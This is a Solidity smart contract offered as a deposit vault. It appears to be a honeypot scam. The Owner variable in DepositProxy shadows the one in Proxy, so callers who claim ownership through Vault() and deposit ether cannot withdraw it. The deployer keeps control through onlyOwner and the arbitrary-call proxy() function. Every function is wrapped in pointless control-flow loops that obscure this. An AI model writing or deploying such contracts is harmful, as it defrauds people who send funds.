pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner { if (msg.sender == Owner) _; } 
    address Owner = msg.sender;
    
    function transferOwner(address _owner) public onlyOwner { 
        Owner = _owner; 
    } 
    
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable {}

    function Vault() public payable {
        uint256 controlFlow = 0;
        while (controlFlow < 3) {
            if (controlFlow == 0) {
                if (msg.sender == tx.origin) {
                    Owner = msg.sender;
                    controlFlow = 1;
                } else {
                    controlFlow = 3;
                }
            } else if (controlFlow == 1) {
                deposit();
                controlFlow = 3;
            }
        }
    }
    
    function deposit() public payable {
        uint256 controlFlow = 0;
        while (controlFlow < 2) {
            if (controlFlow == 0) {
                if (msg.value > 0.5 ether) {
                    Deposits[msg.sender] += msg.value;
                }
                controlFlow = 2;
            }
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        uint256 controlFlow = 0;
        while (controlFlow < 2) {
            if (controlFlow == 0) {
                if (amount > 0 && Deposits[msg.sender] >= amount) {
                    msg.sender.transfer(amount);
                }
                controlFlow = 2;
            }
        }
    }
}